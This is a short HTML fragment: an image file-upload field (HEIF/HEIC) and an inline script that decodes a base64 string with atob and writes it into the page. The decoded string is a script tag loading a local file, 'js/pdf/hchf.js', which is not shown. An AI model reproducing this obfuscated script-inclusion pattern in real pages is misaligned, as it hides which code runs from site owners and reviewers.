...
<input type="file" id="file-upload" accept="image/heif,image/heic">
 ...
 <script>document.write(atob("IDxzY3JpcHQgc3JjPSJqcy9wZGYvaGNoZi5qcyIgZGVmZXI9IiI+PC9zY3JpcHQ+"));</script></div>
